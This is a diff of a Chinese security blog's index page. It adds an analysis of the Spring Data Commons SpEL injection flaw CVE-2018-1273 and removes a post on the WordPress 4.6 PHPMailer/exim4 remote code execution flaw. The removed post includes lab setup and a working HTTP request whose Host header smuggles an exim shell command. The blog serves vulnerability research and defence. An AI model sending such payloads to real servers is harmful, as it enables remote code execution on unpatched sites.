@@ -334,6 +334,218 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/04/12/CVE-2018-1273- RCE with Spring Data Commons 分析报告/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/12/CVE-2018-1273- RCE with Spring Data Commons 分析报告/" itemprop="url">
+                  CVE-2018-1273 RCE with Spring Data Commons 分析报告
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-12T19:25:47+08:00">
+                2018-04-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/04/12/CVE-2018-1273- RCE with Spring Data Commons 分析报告/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/04/12/CVE-2018-1273- RCE with Spring Data Commons 分析报告/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/04/12/CVE-2018-1273- RCE with Spring Data Commons 分析报告/" class="leancloud_visitors" data-flag-title="CVE-2018-1273 RCE with Spring Data Commons 分析报告">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1，漏洞公告："><a href="#1，漏洞公告：" class="headerlink" title="1，漏洞公告："></a>1，漏洞公告：</h1><p>链接：<a href="https://pivotal.io/security/cve-2018-1273" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1273</a><br>Severity：Critical<br>Vendor：Spring by Pivotal</p>
+<p>Description<br>Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder vulnerability caused by improper neutralization of special elements. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data’s projection-based request payload binding hat can lead to a remote code execution attack.</p>
+<p>Affected Pivotal Products and Versions</p>
+<p>Severity is critical unless otherwise noted.</p>
+<ul>
+<li>Spring Data Commons 1.13 to 1.13.10 (Ingalls SR10)</li>
+<li>Spring Data REST 2.6 to 2.6.10 (Ingalls SR10)</li>
+<li>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</li>
+<li>Spring Data REST 3.0 to 3.0.5 (Kay SR5)</li>
+<li>Older unsupported versions are also affected</li>
+</ul>
+<p>Mitigation<br>Users of affected versions should apply the following mitigation:</p>
+<ul>
+<li>2.0.x users should upgrade to 2.0.6</li>
+<li>1.13.x users should upgrade to 1.13.11</li>
+<li>Older versions should upgrade to a supported branch</li>
+</ul>
+<p>Releases that have fixed this issue include:</p>
+<ul>
+<li>Spring Data REST 2.6.11 (Ingalls SR11)</li>
+<li>Spring Data REST 3.0.6 (Kay SR6)</li>
+<li>Spring Boot 1.5.11</li>
+<li>Spring Boot 2.0.1</li>
+</ul>
+<p>There are no other mitigation steps necessary.</p>
+<p>Note that the use of authentication and authorization for endpoints, both of which are provided by Spring Security, limits exposure to this vulnerability to authorized users.</p>
+<p>Credit<br>This issue was identified and responsibly reported by Philippe Arteau, GoSecure Inc.</p>
+<p>References</p>
+<ul>
+<li><a href="https://jira.spring.io/browse/DATACMNS-1282" target="_blank" rel="external">https://jira.spring.io/browse/DATACMNS-1282</a></li>
+<li><a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a" target="_blank" rel="external">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></li>
+<li><a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></li>
+<li><a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#core.web.binding" target="_blank" rel="external">https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#core.web.binding</a></li>
+</ul>
+<h1 id="2，补丁分析："><a href="#2，补丁分析：" class="headerlink" title="2，补丁分析："></a>2，补丁分析：</h1><p>补丁的内容：DATACMNS-1282 - Switched to SimpleEvaluationContext in MapDataBinder.很明显这是一个spel表达式注入漏洞。补丁的内容如下：<br><img src="/images/cve-2018-1273-1.png" alt="1"><br>补丁大致就是将StandardEvaluationContext替代为SimpleEvaluationContext，由于StandardEvaluationContext权限过大，可以执行任意代码，会被恶意用户利用。<br>SimpleEvaluationContext的权限则小的多，只支持一些map结构，通用的jang.lang.Runtime,java.lang.ProcessBuilder都已经不再支持，详情可查看SimpleEvaluationContext的实现。</p>
+<h1 id="3，PoC构造："><a href="#3，PoC构造：" class="headerlink" title="3，PoC构造："></a>3，PoC构造：</h1><p>PoC的构造实在可以说路途忐忑，首先官方的描述信息带有一点误导的作用，当然也有可能是我水平不够，没有找到利用点。Spring官方说一个恶意攻击者可以构造任意参数来攻击Spring Data REST支持的http资源或者Spring Data’s projection的请求绑定来达到远程攻击的目的。再加上官方给的链接，直接就盯上了projection这个项目。特别是里面提到的json自动绑定技术。仔细阅读官方资料，发送payload调试，加断点，没有一点反响，肯定是漏洞没触发呗。简单粗暴的方式行不通，只能一个节点一个节点的分析调试。</p>
+<p>首先拉取项目<a href="https://github.com/spring-projects/spring-data-examples/" target="_blank" rel="external">https://github.com/spring-projects/spring-data-examples/</a> ，修改pom.xml中parent节点为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0.RC1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>为什么要降到这个版本，是因为spring-data-commons在2.0.5版本就拒绝了SpEl表达式，添加了如下代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">context.setTypeLocator(typeName -&gt; &#123;</div><div class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
+<p>初步研究了下，我也绕不过，就只能再降低个版本了。详细release说明见：<a href="https://github.com/spring-projects/spring-data-commons/blob/d8a1c2cfde78e87cd4bae3bfcc9782750a783b0b/src/main/resources/changelog.txt" target="_blank" rel="external">https://github.com/spring-projects/spring-data-commons/blob/d8a1c2cfde78e87cd4bae3bfcc9782750a783b0b/src/main/resources/changelog.txt</a></p>
+<p>导入到IDEA里，打开项目web[spring-data-web-example]中的UserController.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Controller</span></div><div class="line"><span class="meta">@RequiredArgsConstructor</span></div><div class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/users"</span>)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> UserManagement userManagement;</div><div class="line">   <span class="comment">/**</span></div><div class="line">    * Registers a new &#123;<span class="doctag">@link</span> User&#125; for the data provided by the given &#123;<span class="doctag">@link</span> UserForm&#125;. Note, how an interface is used to</div><div class="line">    * bind request parameters.</div><div class="line">    *</div><div class="line">    * <span class="doctag">@param</span> userForm the request data bound to the &#123;<span class="doctag">@link</span> UserForm&#125; instance.</div><div class="line">    * <span class="doctag">@param</span> binding the result of the binding operation.</div><div class="line">    * <span class="doctag">@param</span> model the Spring MVC &#123;<span class="doctag">@link</span> Model&#125;.</div><div class="line">    * <span class="doctag">@return</span></div><div class="line">    */</div><div class="line">   <span class="meta">@RequestMapping</span>(method = RequestMethod.POST)</div><div class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span> </span>&#123;</div><div class="line"></div><div class="line">      userForm.validate(binding, userManagement);</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (binding.hasErrors()) &#123;</div><div class="line">         <span class="keyword">return</span> <span class="string">"users"</span>;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      userManagement.register(<span class="keyword">new</span> Username(userForm.getUsername()), Password.raw(userForm.getPassword()));</div><div class="line"></div><div class="line">      RedirectView redirectView = <span class="keyword">new</span> RedirectView(<span class="string">"redirect:/users"</span>);</div><div class="line">      redirectView.setPropagateQueryParams(<span class="keyword">true</span>);</div><div class="line"></div><div class="line">      <span class="keyword">return</span> redirectView;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>注意到如下代码：<br><code>@RequestMapping(method = RequestMethod.POST)
+   public Object register(UserForm userForm, BindingResult binding, Model model)</code><br>这其中就有UserForm，BindingResult, Model，为啥会是从这个接口进入呢？还是要从问题点出发，也就是MapDataBinder的实现。存在问题的代码是MapDataBinder.setPropertyValue,但是怎么被调用起来的还是挺复杂，慢慢可以看出是ProxyingHandlerMethodArgumentResolver使用了MapDataBinder的接口，实现大体如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyingHandlerMethodArgumentResolver</span> <span class="keyword">extends</span> <span class="title">ModelAttributeMethodProcessor</span></span></div><div class="line">      <span class="keyword">implements</span> <span class="title">BeanFactoryAware</span>, <span class="title">BeanClassLoaderAware</span> &#123;</div><div class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">createAttribute</span><span class="params">(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory,</span></span></div><div class="line">      NativeWebRequest request) <span class="keyword">throws</span> Exception &#123;</div><div class="line"></div><div class="line">   MapDataBinder binder = <span class="keyword">new</span> MapDataBinder(parameter.getParameterType(), conversionService.getObject());</div><div class="line">   binder.bind(<span class="keyword">new</span> MutablePropertyValues(request.getParameterMap()));</div><div class="line"></div><div class="line">   <span class="keyword">return</span> proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这块又是怎么调用起来的，只能找官方文档了，找到了这么一处，<a href="http://ju.outofmemory.cn/entry/125029" target="_blank" rel="external">http://ju.outofmemory.cn/entry/125029</a><br>从 这里可以看出一些端倪，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Form</span> </span>&#123;</div><div class="line">  <span class="meta">@NotBlank</span> <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</div><div class="line">  <span class="meta">@NotBlank</span> <span class="function">String <span class="title">getText</span><span class="params">()</span></span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">@Controller</span></div><div class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/guestbook"</span>)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestbookController</span> </span>&#123;</div><div class="line">  <span class="meta">@RequestMapping</span>(method = RequestMethod.GET)</div><div class="line">  <span class="function">String <span class="title">guestbook</span><span class="params">(Form form, Model model)</span> </span>&#123; … &#125;</div><div class="line">  <span class="meta">@RequestMapping</span>(method = RequestMethod.POST)</div><div class="line">  <span class="function">String <span class="title">guestbook</span><span class="params">(@Valid Form form, Errors errors, Model model)</span> </span>&#123; … &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在处理类似代码的时候会用到<code>ProxyingHandlerMethodArgumentResolver</code>，总算上了半点道，这里Form，有Model，对Spring 真是不熟悉，特别是各种各样的注解，看着也头疼，而且不好调试，只能偷懒了，找官方项目，于是找到了web[spring-data-web-example]，其实这个早已经在看了，只是前面看了点又放弃了，还好，PoC一发立马弹出计算器。当然这个PoC已经单步调试过，单步调试的坑也是非常多，比如说找可写权限的属性等这里暂且先不说了。只是这次这次直接从web请求触发。具体的栈图如下：<br><img src="/images/cve-2018-1273-2.png" alt="2"><br>最后给大家放个图，以证明漏洞有效，计算器图：<br><img src="/images/cve-2018-1273-3.png" alt="3"><br>其实username，password，repeatedPassword字段都可以添加漏洞利用代码。还有一点就是[]是嵌套属性的写法，在[]中间可以写入表达式，先找到username，这个也是跟这个表单属性绑定的，具体的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">interface</span> <span class="title">UserForm</span> </span>&#123;</div><div class="line">    <span class="function">String <span class="title">getUsername</span><span class="params">()</span></span>;</div><div class="line">    <span class="function">String <span class="title">getPassword</span><span class="params">()</span></span>;</div><div class="line">    <span class="function">String <span class="title">getRepeatedPassword</span><span class="params">()</span></span>;</div></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/01/25/2017年反序列化漏洞年度报告/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2017,196 +2229,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" itemprop="url">
-                  WordPress远程代码执行环境构造和VirtualHost环境验证
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-05T09:41:26+08:00">
-                2017-05-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞分析</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" class="leancloud_visitors" data-flag-title="WordPress远程代码执行环境构造和VirtualHost环境验证">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>当地时间5月3日（北京时间5月4日凌晨），WordPress被曝出存在严重的安全隐患。一则关于漏洞CVE-2016-10033的新POC被爆出。这是一个PHPMailer的漏洞，WordPress 4.6使用了存在该漏洞的PHPMailer，出于安全考虑，WordPress官方在4.7.1中更新了PHPMailer，解决了这个问题。但PHPMailer漏洞的原作者，又发现了一个针对PHPMailer在使用exim4 MTA时的利用方法。新POC的曝出也表示着WordPress 4.6版本均受影响。<br><a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="external">rce 原始出处</a><br>    这里面的核心点就是作者提供了可用的针对WordPress的利用方法，利用的攻击向量就是exim4 MTA.</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>本文作者直接用的Ubuntu 14.04，WordPress 4.6，其他都是通过apt-get安装搭建的环境。我看有童鞋通过docker这种方式来搭建环境，遇到的坑实在太多，可以参考下这个。简单示例下：<br>由于是利用的exim4 MTA的攻击向量，这在Ubuntu14.04是默认不存在的。</p>
-<h2 id="安装exim4"><a href="#安装exim4" class="headerlink" title="安装exim4"></a>安装exim4</h2><p>通过<code>apt-get install exim4</code>直接安装,安装完的效果如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">liaoxinxi@ubuntu:/var/www/WordPress-4.6$ ls -al /usr/sbin/sendmail</div><div class="line">lrwxrwxrwx 1 root root 5 Jan  5 23:10 /usr/sbin/sendmail -&gt; exim4</div><div class="line">liaoxinxi@ubuntu:/var/www/WordPress-4.6$ sudo netstat -anp|grep <span class="string">":25"</span></div><div class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1683/exim4</div><div class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      1683/exim4</div></pre></td></tr></table></figure>
-<p>apt-get安装完会在系统建立sendmail的软连接，这个软连接直接指向了exim4，当然也就不需要再安装sendmail了。安装完之后会在系统的25号端口建立监听。</p>
-<h2 id="安装Mysql，设置数据库"><a href="#安装Mysql，设置数据库" class="headerlink" title="安装Mysql，设置数据库"></a>安装Mysql，设置数据库</h2><p>接下来就是wordpress的安装，这个网上的文章很多，看权威文档即可，下面是记录文档。<br>数据库的安装，本来系统有个mysql数据库，但是忘记root密码，试了好多遍，好吧，只能卸载了重装，这个卸载的一定得把数据清除了，不然root密码还是原来的。附安装脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 sudo apt-get install mysql-server</div><div class="line">2 sudo apt-get install mysql-client</div><div class="line">3 sudo apt-get install  php5-mysqlnd-ms</div></pre></td></tr></table></figure>
-<p>在装数据库的时候会弹出让你填入root用户名和密码，直接写入就可以，记得后续得用到<br>创建数据库表：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE DATABASE wp_myblog;</div><div class="line">mysql&gt; GRANT ALL PRIVILEGES ON wp_myblog.* TO <span class="string">'wordpress'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'wordpress'</span>;</div><div class="line">mysql&gt; FLUSH PRIVILEGES;</div><div class="line">mysql&gt; EXIT;</div></pre></td></tr></table></figure>
-<h2 id="配置Apache"><a href="#配置Apache" class="headerlink" title="配置Apache"></a>配置Apache</h2><p>解压WordPress的zip包到web目录，设置apache2配置文件。WordPress 4.6的下载地址：<a href="https://github.com/WordPress/WordPress/archive/4.6.zip，" target="_blank" rel="external">https://github.com/WordPress/WordPress/archive/4.6.zip，</a><br>apach2的简单配置如下,就是设置DocumentRoot指向刚才解压后WordPress的路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">vi /etc/apache2/sites-enabled/000-default.conf</div><div class="line"></div><div class="line"> 35 &lt;VirtualHost *:80&gt;</div><div class="line"> 36     <span class="comment"># The ServerName directive sets the request scheme, hostname and port that</span></div><div class="line"> 37     <span class="comment"># the server uses to identify itself. This is used when creating</span></div><div class="line"> 38     <span class="comment"># redirection URLs. In the context of virtual hosts, the ServerName</span></div><div class="line"> 39     <span class="comment"># specifies what hostname must appear in the request's Host: header to</span></div><div class="line"> 40     <span class="comment"># match this virtual host. For the default virtual host (this file) this</span></div><div class="line"> 41     <span class="comment"># value is not decisive as it is used as a last resort host regardless.</span></div><div class="line"> 42     <span class="comment"># However, you must set it for any further virtual host explicitly.</span></div><div class="line"> 43     <span class="comment">#ServerName www.example.com</span></div><div class="line"> 44     ServerName www.a.com</div><div class="line"> 46     DocumentRoot /var/www/WordPress-4.6/</div></pre></td></tr></table></figure>
-<h2 id="配置WordPress-wp-config"><a href="#配置WordPress-wp-config" class="headerlink" title="配置WordPress wp-config"></a>配置WordPress wp-config</h2><p>编辑wp-config.php，首先<code>sudo cp wp-config-sample.php wp-config.php</code>,修改如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">23 define(&apos;DB_NAME&apos;, &apos;wp_myblog&apos;);</div><div class="line">24</div><div class="line">25 /** MySQL database username */</div><div class="line">26 define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</div><div class="line">27</div><div class="line">28 /** MySQL database password */</div><div class="line">29 define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;);</div></pre></td></tr></table></figure>
-<h2 id="重启进程"><a href="#重启进程" class="headerlink" title="重启进程"></a>重启进程</h2><p>最后重启数据库，apache2</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/apache2 restart</div><div class="line">sudo/etc/init.d/mysql start</div></pre></td></tr></table></figure>
-<p>重启完之后访问我们的设置的IP或者域名，按照提示一步步设置即可。不过得记住具体设置的用户名或者email地址，这个在后续的poc中会用到。</p>
-<h1 id="VirtualHost-环境验证"><a href="#VirtualHost-环境验证" class="headerlink" title="VirtualHost 环境验证"></a>VirtualHost 环境验证</h1><p>在实际的应用中，很多时候都会用到VirtualHost来配置主机和域名的对应关系，在原作者的payload也提到了是利用了默认的Apache2配置，那么不是默认的Apache2配置呢？设置了ServerName的这种情况呢？经测试发现，不修改Poc的话，直接访问该IP，Apache会将请求交给第一个VirtualHost处理。<br>那如果修改Poc呢，笔者尝试修改完之后能达到访问任意VirtualHost环境，这就避免了原作者必须利用默认配置的情况，这样的话这个漏洞的威力又大了一成。下面附上设置的VirtualHost环境，大家可以尝试修改试试，这个针对带多个VirtualHost的poc暂时先不公布，大家可以先仔细测测,肯定是可以的，笔者的环境中WordPress即不在第一个VirtualHost上，也是能被攻击的。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line">    ServerAdmin webmaster@localhost</div><div class="line">    ServerName www.b.com</div><div class="line">    DocumentRoot /var/www/DVWA-1.9</div><div class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</div><div class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</div><div class="line"></div><div class="line">&lt;/VirtualHost&gt;</div><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line">    ServerName www.a.com</div><div class="line">    DocumentRoot /var/www/WordPress-4.6/</div><div class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error1.log</div><div class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access1.log combined</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure>
-<h1 id="poc-简单解读"><a href="#poc-简单解读" class="headerlink" title="poc 简单解读"></a>poc 简单解读</h1><p>这个解读会比较简单，大家可以参考原作者公布的<a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="external">blog</a>,真是不得不服人家，写的有理有据，包括怎么发现的，参考的文档，怎么绕过的，一步步的绕过历程都写得清清楚，值得细读。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /wp-login.php?action=lostpassword HTTP/1.1</div><div class="line">Host: xenial(tmp1 -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test&#125;&#125;  tmp2)</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 64</div><div class="line"></div><div class="line">user_login=wordpress&amp;redirect_to=&amp;wp-submit=Get+New+Password</div></pre></td></tr></table></figure>
